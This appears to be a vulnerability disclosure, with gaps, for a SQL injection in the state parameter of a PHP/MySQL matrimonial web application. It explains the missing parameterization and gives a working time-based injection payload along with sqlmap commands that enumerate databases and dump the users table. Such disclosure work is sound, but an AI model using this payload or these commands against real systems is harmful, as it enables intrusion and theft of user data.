...
The vulnerability exists because user-controlled input from the state parameter is  concatenated directly into an SQL query without server-side sanitization or parameterized  statements. 
...
Item Details: Matrimonial System IN PHP, CSS, JS, AND MYSQL
...
Because no parameterized query or escaping mechanism is used, arbitrary SQL statements can be injected via the state parameter. The mysqlexec() function executes the query directly via mysqli_query() with no sanitization applied at any layer, allowing the injected payload to reach the database unfiltered.

**Proof of Concept**

Step 1 – search page 

The vulnerable Regular search form accepts a user-controlled state parameter.
...
The intercepted POST request was modified by injecting a time-based SQL payload into the  state parameter. 

Payload: 

sex=male&maritalstatus=Single&country=Dubai&district=Calicut&state=Kerala'%2b(select*from(select(sleep(20)))a)%2b'&religion=Christian-All&mothertounge=Tamil&agemin=19&agemax=50&search=Search
...
command: ```python python .\sqlmap.py -r .\code_test_1.txt -p state --dbs```

![POC](images/sqli%201.png)

SQLMap confirmed that the state parameter is injectable using: 

• Boolean-based Blind SQL Injection  
• Error-based SQL Injection  
• Time-based Blind SQL Injection 

```python python .\sqlmap.py -r .\code_test_1.txt -p state -D matrimony --tables ```
...
command: ```python python .\sqlmap.py -r .\code_test_1.txt -p state -D matrimony -T users --dump```
